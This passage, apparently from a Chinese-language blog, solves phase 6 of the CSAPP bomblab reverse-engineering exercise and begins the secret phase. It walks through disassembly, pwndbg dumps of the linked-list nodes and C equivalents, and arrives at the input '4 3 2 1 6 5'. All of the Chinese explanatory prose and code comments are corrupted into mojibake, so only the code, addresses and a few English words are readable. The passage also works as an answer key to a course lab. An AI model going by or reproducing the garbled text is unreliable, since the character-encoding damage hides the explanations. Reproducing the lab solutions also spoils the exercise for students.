class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(*v1 - <span class="number">1</span>) &gt; <span class="number">5</span> )</span><br><span class="line">      <span class="built_in">explode_bomb</span>(a1, (<span class="type">const</span> <span class="type">char</span> *)v15);</span><br><span class="line">    <span class="keyword">if</span> ( ++v2 == <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = v2;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v1 == v15[v3] )</span><br><span class="line">        <span class="built_in">explode_bomb</span>(a1, (<span class="type">const</span> <span class="type">char</span> *)v15);</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt;= <span class="number">5</span> );</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯ç­‰ä»·äºï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>  (<span class="type">int</span> i=<span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] - <span class="number">1</span> &gt; <span class="number">5</span>) <span class="built_in">bomb</span>()</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j=i+<span class="number">1</span>; j&lt;=<span class="number">5</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[j] == arr[i]) <span class="built_in">bomb</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ä¹Ÿå°±æ˜¯éœ€è¦è¾“å…¥çš„6ä¸ªæ•°å­—éƒ½ä¸å¤§äº6ï¼Œä¸”äº’å¼‚</span></span><br></pre></td></tr></table></figure><aside>ğŸ’¡ ç¬”è®°ï¼špwndbgä¸­stackåŒºå‘å·¦æŒ‡çš„ç®­å¤´ä»£è¡¨å­˜æ”¾çš„æ•°æ®æ˜¯å¤šå°‘ï¼›å‘å³æŒ‡çš„ç®­å¤´è¡¨ç¤ºå­˜æ”¾çš„åœ°å€æ˜¯å¤šå°‘ï¼ˆæœ€å³è¾¹é€šå¸¸ä¼šæœ‰ä¸ªå‘å·¦ç®­å¤´ï¼Œä»£è¡¨æœ€ç»ˆæŒ‡å‘çš„æ•°æ®ï¼‰</aside><h2 id="Part-6-2-ä¸ƒå‡å¤„ç†">Part 6.2 ä¸ƒå‡å¤„ç†</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> ---------------------------- <span class="keyword">for</span>: ä½¿ç”¨raxä½œä¸ºå¾ªç¯å˜é‡ï¼Œåˆå§‹åŒ–ä¸ºr14=rsp</span><br><span class="line"><span class="number">0x0000000000401153</span> &lt;+<span class="number">95</span>&gt;:    lea    rsi,[rsp+<span class="number">0x18</span>]  ; è¾“å…¥çš„ç»“å°¾\<span class="number">0</span></span><br><span class="line"><span class="number">0x0000000000401158</span> &lt;+<span class="number">100</span>&gt;:   mov    rax,r14  ; r14åˆå§‹æ—¶æŒ‡å‘rsp, è¾“å…¥çš„é¦–åœ°å€</span><br><span class="line"><span class="number">0x000000000040115b</span> &lt;+<span class="number">103</span>&gt;:   mov    ecx,<span class="number">0x7</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x0000000000401160</span> &lt;+<span class="number">108</span>&gt;:   mov    edx,ecx</span><br><span class="line"><span class="number">0x0000000000401162</span> &lt;+<span class="number">110</span>&gt;:   sub    edx,DWORD PTR [rax]</span><br><span class="line"><span class="number">0x0000000000401164</span> &lt;+<span class="number">112</span>&gt;:   mov    DWORD PTR [rax],edx</span><br><span class="line"><span class="number">0x0000000000401166</span> &lt;+<span class="number">114</span>&gt;:   add    rax,<span class="number">0x4</span></span><br><span class="line"><span class="number">0x000000000040116a</span> &lt;+<span class="number">118</span>&gt;:   cmp    rax,rsi</span><br><span class="line"><span class="number">0x000000000040116d</span> &lt;+<span class="number">121</span>&gt;:   jne    <span class="number">0x401160</span> &lt;phase_6+<span class="number">108</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">0x000000000040116f</span> &lt;+<span class="number">123</span>&gt;:   mov    esi,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x0000000000401174</span> &lt;+<span class="number">128</span>&gt;:   jmp    <span class="number">0x401197</span> &lt;phase_6+<span class="number">163</span>&gt;</span><br></pre></td></tr></table></figure><p>ç¨‹åºç›®çš„æ˜¯ï¼ŒåŸåœ°ä¿®æ”¹æ•°ç»„ï¼šå…ƒç´ å€¼ = 7 - å…ƒç´ å€¼ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i)</span><br><span class="line">  arr[i] = <span class="number">7</span> - arr[i]</span><br><span class="line"><span class="comment">// ä¸‹é¢å°†è½¬å˜åçš„arræ•°ç»„ç§°å‘¼ä¸ºnarr</span></span><br></pre></td></tr></table></figure><h2 id="Part-6-3-æ ¹æ®è¾“å…¥narr-i-å°†node-narr-i-çš„åœ°å€å¤åˆ¶åˆ°stack-nnode-i">Part 6.3 æ ¹æ®è¾“å…¥narr[i]å°†node[narr[i]]çš„åœ°å€å¤åˆ¶åˆ°stack[nnode[i]]</h2><p>ç¨‹åºå…¥å£ä¸º&lt;phase_6+163&gt;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">---------------------------- å†…å±‚ <span class="keyword">for</span> eax: <span class="number">1</span> ~ rcx<span class="number">-1</span>, rcx = narr[i]</span><br><span class="line">   <span class="number">0x0000000000401176</span> &lt;+<span class="number">130</span>&gt;:   mov    rdx,QWORD PTR [rdx+<span class="number">0x8</span>]  ; node[i] = node[i + <span class="number">1</span>], ä¸€æ¬¡ç§»åŠ¨<span class="number">4</span>ä¸ªå­—(<span class="number">1</span>ä¸ªnode),æ³¨æ„è¿™é‡Œåªç§»åŠ¨rdx,ä¸æ”¹å˜node</span><br><span class="line">   <span class="number">0x000000000040117a</span> &lt;+<span class="number">134</span>&gt;:   add    eax,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040117d</span> &lt;+<span class="number">137</span>&gt;:   cmp    eax,ecx</span><br><span class="line">   <span class="number">0x000000000040117f</span> &lt;+<span class="number">139</span>&gt;:   jne    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401181</span> &lt;+<span class="number">141</span>&gt;:   jmp    <span class="number">0x401188</span> &lt;phase_6+<span class="number">148</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401183</span> &lt;+<span class="number">143</span>&gt;:   mov    edx,<span class="number">0x6032d0</span></span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401188</span> &lt;+<span class="number">148</span>&gt;:   mov    QWORD PTR [rsp+rsi*<span class="number">2</span>+<span class="number">0x20</span>],rdx  ; å‰é¢çš„rsp~rsp+<span class="number">0x20</span>æ”¾è¾“å…¥(<span class="number">6B</span>)å’Œç»“æŸæ ‡å¿—, è¿™é‡Œå¼€å§‹æ”¾node, ä¸€æ¬¡æ“ä½œ<span class="number">8</span>å­—èŠ‚(QWORD)</span><br><span class="line">   <span class="number">0x000000000040118d</span> &lt;+<span class="number">153</span>&gt;:   add    rsi,<span class="number">0x4</span>  ; <span class="number">1</span>ä¸ªnodeæ˜¯<span class="number">4B</span>  ; å¯¹narrä¸­çš„æ¯ä¸ªæ•°å­—</span><br><span class="line">   <span class="number">0x0000000000401191</span> &lt;+<span class="number">157</span>&gt;:   cmp    rsi,<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x0000000000401195</span> &lt;+<span class="number">161</span>&gt;:   je     <span class="number">0x4011ab</span> &lt;phase_6+<span class="number">183</span>&gt;</span><br><span class="line"></span><br><span class="line">---------------------------- å¤–å±‚ <span class="keyword">for</span> rsi &lt;- i, i: <span class="number">0</span> ~ <span class="number">5</span></span><br><span class="line">   <span class="number">0x0000000000401197</span> &lt;+<span class="number">163</span>&gt;:   mov    ecx,DWORD PTR [rsp+rsi*<span class="number">1</span>]  ; rsiåœ¨jmpå‰åˆå§‹åŒ–ä¸º<span class="number">0</span>, åœ¨+<span class="number">153</span>-+<span class="number">161</span>è¿›è¡Œå˜åŠ¨å’Œåˆ¤æ–­</span><br><span class="line">   <span class="number">0x000000000040119a</span> &lt;+<span class="number">166</span>&gt;:   cmp    ecx,<span class="number">0x1</span>  ; åˆ¤æ–­æ•°ç»„ä¸­æ¯ä¸ªæ•°æ˜¯å¦å°äºç­‰äº<span class="number">1</span></span><br><span class="line">   <span class="number">0x000000000040119d</span> &lt;+<span class="number">169</span>&gt;:   jle    <span class="number">0x401183</span> &lt;phase_6+<span class="number">143</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040119f</span> &lt;+<span class="number">171</span>&gt;:   mov    eax,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00000000004011a4</span> &lt;+<span class="number">176</span>&gt;:   mov    edx,<span class="number">0x6032d0</span>  ; rdxæŒ‡å‘node1</span><br><span class="line">   <span class="number">0x00000000004011a9</span> &lt;+<span class="number">181</span>&gt;:   jmp    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br></pre></td></tr></table></figure><p>ç­‰ä»·ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i)</span><br><span class="line">  stack[nnode[i]] = node[narr[i]]  <span class="comment">// nnodeè¡¨ç¤ºæ ˆä¸Šæ”¾nodeçš„åœ°å€ï¼Œå…¶ä½ç½®ä¸iç›¸å…³ï¼Œå€¼ç”±narr[i]ç¡®å®š</span></span><br><span class="line"><span class="comment">// æ ˆä¸Šå­˜æ”¾çš„æ˜¯nodeçš„åœ°å€ï¼ˆ1qword = 64bï¼‰ï¼Œä¸æ˜¯å®Œæ•´çš„node</span></span><br></pre></td></tr></table></figure><p>+176å¤„æœ‰ä¸ªå¥‡æ€ªçš„åœ°å€ï¼Œå¯ä»¥å¾€ä¸‹æŒ‰16è¿›åˆ¶æ ¼å¼æŸ¥30ä¸ªwordçš„æ•°æ®ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>wx <span class="number">0x6032d0</span></span><br><span class="line"><span class="number">0x6032d0</span> &lt;node1&gt;:       <span class="number">0x0000014c</span>      <span class="number">0x00000001</span>      <span class="number">0x006032e0</span>      <span class="number">0x00000000</span>  ; <span class="number">0x006032e0</span>å°±æ˜¯ä¸‹ä¸€ä¸ªnodeçš„åœ°å€</span><br><span class="line"><span class="number">0x6032e0</span> &lt;node2&gt;:       <span class="number">0x000000a8</span>      <span class="number">0x00000002</span>      <span class="number">0x006032f0</span>      <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x6032f0</span> &lt;node3&gt;:       <span class="number">0x0000039c</span>      <span class="number">0x00000003</span>      <span class="number">0x00603300</span>      <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x603300</span> &lt;node4&gt;:       <span class="number">0x000002b3</span>      <span class="number">0x00000004</span>      <span class="number">0x00603310</span>      <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x603310</span> &lt;node5&gt;:       <span class="number">0x000001dd</span>      <span class="number">0x00000005</span>      <span class="number">0x00603320</span>      <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x603320</span> &lt;node6&gt;:       <span class="number">0x000001bb</span>      <span class="number">0x00000006</span>      <span class="number">0x00000000</span>      <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x603330</span>:       <span class="number">0x00000000</span>      <span class="number">0x00000000</span>      <span class="number">0x00000000</span>      <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x603340</span> &lt;host_table&gt;:  <span class="number">0x00402629</span>      <span class="number">0x00000000</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çŒœæµ‹ä½¿ç”¨åˆ°äº†é“¾è¡¨ç»“æ„ï¼Œè¿™ä¸ªé“¾è¡¨ä½¿ç”¨çš„ç»“æ„ä½“ç±»ä¼¼äºï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line"> <span class="type">int</span> sth; <span class="comment">// æŸå››å­—èŠ‚å†…å®¹ï¼Œå…³äºå…¶ç”¨é€”å…ˆæŒ‰ä¸‹ä¸è¡¨ï¼Œåé¢ä¼šçœ‹åˆ°</span></span><br><span class="line"> <span class="type">int</span> input; <span class="comment">// ä¸æˆ‘ä»¬çš„è¾“å…¥æœ‰å…³</span></span><br><span class="line"> node* next; <span class="comment">// ä¸‹ä¸€ä¸ªnodeåœ°å€</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><aside>ğŸ’¡ ç¬”è®°ï¼šQuad wordæ˜¯4ä¸ªå­—ï¼Œ1ä¸ªå­—æ˜¯16ä½ï¼Œ2å­—èŠ‚ï¼Œé‚£ä¹ˆqwordå…¶å°±æ˜¯64ä½ï¼›1ä¸ªintå¯¹åº”dwordï¼Œæ˜¯2å­—ï¼Œ4å­—èŠ‚ã€‚</aside><h2 id="Part-6-4">Part 6.4</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00000000004011ab</span> &lt;+<span class="number">183</span>&gt;:   mov    rbx,QWORD PTR [rsp+<span class="number">0x20</span>] </span><br><span class="line"><span class="number">0x00000000004011b0</span> &lt;+<span class="number">188</span>&gt;:   lea    rax,[rsp+<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0x00000000004011b5</span> &lt;+<span class="number">193</span>&gt;:   lea    rsi,[rsp+<span class="number">0x50</span>]  ; ç»“å°¾</span><br><span class="line"><span class="number">0x00000000004011ba</span> &lt;+<span class="number">198</span>&gt;:   mov    rcx,rbx</span><br><span class="line"></span><br><span class="line"><span class="number">0x00000000004011bd</span> &lt;+<span class="number">201</span>&gt;:   mov    rdx,QWORD PTR [rax]</span><br><span class="line"><span class="number">0x00000000004011c0</span> &lt;+<span class="number">204</span>&gt;:   mov    QWORD PTR [rcx+<span class="number">0x8</span>],rdx</span><br><span class="line"><span class="number">0x00000000004011c4</span> &lt;+<span class="number">208</span>&gt;:   add    rax,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x00000000004011c8</span> &lt;+<span class="number">212</span>&gt;:   cmp    rax,rsi</span><br><span class="line"><span class="number">0x00000000004011cb</span> &lt;+<span class="number">215</span>&gt;:   je     <span class="number">0x4011d2</span> &lt;phase_6+<span class="number">222</span>&gt;</span><br><span class="line"><span class="number">0x00000000004011cd</span> &lt;+<span class="number">217</span>&gt;:   mov    rcx,rdx</span><br><span class="line"><span class="number">0x00000000004011d0</span> &lt;+<span class="number">220</span>&gt;:   jmp    <span class="number">0x4011bd</span> &lt;phase_6+<span class="number">201</span>&gt;</span><br><span class="line"><span class="number">0x00000000004011d2</span> &lt;+<span class="number">222</span>&gt;:   mov    QWORD PTR [rdx+<span class="number">0x8</span>],<span class="number">0x0</span>  ; è®¾ç½®é“¾è¡¨ç»“å°¾ä¸ºnull</span><br></pre></td></tr></table></figure><p>è¿è¡Œæ—¶ä¿¡æ¯ï¼šå¯ä»¥çœ‹åˆ°ç¡®å®å°†nodeç§»åŠ¨åˆ°äº†rsp+20çš„ä½ç½®ï¼šç”±äºè¾“å…¥ä¸º<code>1 2 3 4 5 6</code>ï¼Œç”¨7å‡åå¾—<code>6 5 4 3 2 1</code>, åˆ†åˆ«å¯¹åº”node6 - node1ã€‚è‹¥è¾“å…¥æ”¹ä¸º<code>4 3 2 1 5 6</code>ï¼Œåˆ†åˆ«ä¸º<code>node 3 4 5 6 2 1</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">â–º <span class="number">0x4011ab</span> &lt;phase_6+<span class="number">183</span>&gt;    mov    rbx, qword ptr [rsp + <span class="number">0x20</span>]</span><br><span class="line">   <span class="number">0x4011b0</span> &lt;phase_6+<span class="number">188</span>&gt;    lea    rax, [rsp + <span class="number">0x28</span>]</span><br><span class="line">   <span class="number">0x4011b5</span> &lt;phase_6+<span class="number">193</span>&gt;    lea    rsi, [rsp + <span class="number">0x50</span>]</span><br><span class="line">   <span class="number">0x4011ba</span> &lt;phase_6+<span class="number">198</span>&gt;    mov    rcx, rbx</span><br><span class="line">   <span class="number">0x4011bd</span> &lt;phase_6+<span class="number">201</span>&gt;    mov    rdx, qword ptr [rax]</span><br><span class="line">   <span class="number">0x4011c0</span> &lt;phase_6+<span class="number">204</span>&gt;    mov    qword ptr [rcx + <span class="number">8</span>], rdx</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ r14 rsp     <span class="number">0x7fffffffdc00</span> â—‚â€” <span class="number">0x500000006</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚             <span class="number">0x7fffffffdc08</span> â—‚â€” <span class="number">0x300000004</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚ r13<span class="number">-4</span> rbp<span class="number">-4</span> <span class="number">0x7fffffffdc10</span> â—‚â€” <span class="number">0x100000002</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚             <span class="number">0x7fffffffdc18</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚             <span class="number">0x7fffffffdc20</span> â€”â–¸ <span class="number">0x603320</span> (node6) â—‚â€” <span class="number">0x6000001bb</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚             <span class="number">0x7fffffffdc28</span> â€”â–¸ <span class="number">0x603310</span> (node5) â—‚â€” <span class="number">0x5000001dd</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚             <span class="number">0x7fffffffdc30</span> â€”â–¸ <span class="number">0x603300</span> (node4) â—‚â€” <span class="number">0x4000002b3</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚             <span class="number">0x7fffffffdc38</span> â€”â–¸ <span class="number">0x6032f0</span> (node3) â—‚â€” <span class="number">0x30000039c</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l2-bomblab/Untitled%202.png" alt="Untitled"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">6</span>; ++i)</span><br><span class="line">(*stack[nnode[i]]).next = *stack[nnode[i + <span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line">node[<span class="number">6</span>].next = <span class="literal">nullptr</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„æ¬åˆ°æ ˆçš„æ•°æ®é¡ºåºä¸ä¸€å®šæ˜¯654321ï¼Œè¿™æ ·ä¸€ä¸ªä¸ªå¾€ååˆé‡æ–°æ’åºå¥½äº†ï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹å…¶ç›®çš„æ˜¯è¦è¿›è¡Œéå†ã€‚</p><h2 id="Part-6-5-éå†æ£€æŸ¥é“¾è¡¨ä¸­å€¼å¤§å°">Part 6.5 éå†æ£€æŸ¥é“¾è¡¨ä¸­å€¼å¤§å°</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">---------------------------- <span class="keyword">for</span> ebp: <span class="number">5</span>~<span class="number">1</span></span><br><span class="line"> <span class="number">0x00000000004011da</span> &lt;+<span class="number">230</span>&gt;:   mov    ebp,<span class="number">0x5</span></span><br><span class="line"></span><br><span class="line"> <span class="number">0x00000000004011df</span> &lt;+<span class="number">235</span>&gt;:   mov    rax,QWORD PTR [rbx+<span class="number">0x8</span>]  ; rbxæŒ‡å‘å¤´æŒ‡é’ˆ</span><br><span class="line"> <span class="number">0x00000000004011e3</span> &lt;+<span class="number">239</span>&gt;:   mov    eax,DWORD PTR [rax]  ; ç§»åŠ¨å•å­—èŠ‚: æ˜¯nodeçš„ç¬¬ä¸€ä¸ªå­—æ®µ</span><br><span class="line"> <span class="number">0x00000000004011e5</span> &lt;+<span class="number">241</span>&gt;:   cmp    DWORD PTR [rbx],eax  ; æ¯”çš„ä¹Ÿæ˜¯node.sth</span><br><span class="line"> <span class="number">0x00000000004011e7</span> &lt;+<span class="number">243</span>&gt;:   jge    <span class="number">0x4011ee</span> &lt;phase_6+<span class="number">250</span>&gt;</span><br><span class="line"> <span class="number">0x00000000004011e9</span> &lt;+<span class="number">245</span>&gt;:   call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;]</span><br><span class="line"></span><br><span class="line"> <span class="number">0x00000000004011ee</span> &lt;+<span class="number">250</span>&gt;:   mov    rbx,QWORD PTR [rbx+<span class="number">0x8</span>]  ; è®¿é—®nextå­—æ®µ</span><br><span class="line"> <span class="number">0x00000000004011f2</span> &lt;+<span class="number">254</span>&gt;:   sub    ebp,<span class="number">0x1</span></span><br><span class="line"> <span class="number">0x00000000004011f5</span> &lt;+<span class="number">257</span>&gt;:   jne    <span class="number">0x4011df</span> &lt;phase_6+<span class="number">235</span>&gt;</span><br><span class="line"> <span class="number">0x00000000004011f7</span> &lt;+<span class="number">259</span>&gt;:   add    rsp,<span class="number">0x50</span></span><br><span class="line"> <span class="number">0x00000000004011fb</span> &lt;+<span class="number">263</span>&gt;:   pop    rbx</span><br><span class="line"> <span class="number">0x00000000004011fc</span> &lt;+<span class="number">264</span>&gt;:   pop    rbp</span><br><span class="line"> <span class="number">0x00000000004011fd</span> &lt;+<span class="number">265</span>&gt;:   pop    r12</span><br><span class="line"> <span class="number">0x00000000004011ff</span> &lt;+<span class="number">267</span>&gt;:   pop    r13</span><br><span class="line"> <span class="number">0x0000000000401201</span> &lt;+<span class="number">269</span>&gt;:   pop    r14</span><br><span class="line"> <span class="number">0x0000000000401203</span> &lt;+<span class="number">271</span>&gt;:   ret</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æœç„¶å¯¹é“¾è¡¨è¿›è¡Œäº†éå†ï¼Œçœ‹æ¯ä¸ªå…ƒç´ æ˜¯å¦éƒ½å¤§äºåä¸€ä¸ªå…ƒç´ ï¼Œè‹¥å¦åˆ™å¼•çˆ†ç‚¸å¼¹ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">idx = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">5</span>; i &gt; <span class="number">0</span>; --i) &#123;</span><br><span class="line"><span class="keyword">if</span> (node[idx].sth &gt; node[idx+<span class="number">1</span>].sth)  &#123;</span><br><span class="line">idx++;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">bomb</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨x/30wx 0x6032d0æŸ¥çœ‹nodesçš„sthå€¼å¤§å°ï¼Œç¡®è®¤ä»å¤§åˆ°å°çš„é¡ºåºä¸ºï¼š<code>node 3 4 5 6 1 2</code>ï¼Œå¯¹åº”è¾“å…¥ä¸º <code>4 3 2 1 6 5</code>ã€‚</p><h1 id="secret-phase">secret_phase</h1><h2 id="Part-s-1-phase-defused">Part s.1 phase_defused</h2><p>åœ¨è¯»å…¥6æ¡å­—ç¬¦ä¸²åæ£€æŸ¥ç¬¬4ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç”±3éƒ¨åˆ†ç»„æˆï¼Œç¬¬3éƒ¨åˆ†æ˜¯&quot;DrEvil&quot;</p><p>åæ±‡ç¼–ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">phase_defused</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+8h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+Ch] [rbp-6Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">88</span>]; <span class="comment">// [rsp+10h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+68h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( num_input_strings == <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(&amp;unk_603870, <span class="string">&quot;%d %d %s&quot;</span>, &amp;v1, &amp;v2, v3) == <span class="number">3</span></span><br><span class="line">      &amp;&amp; !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">strings_not_equal</span>(v3, <span class="string">&quot;DrEvil&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span 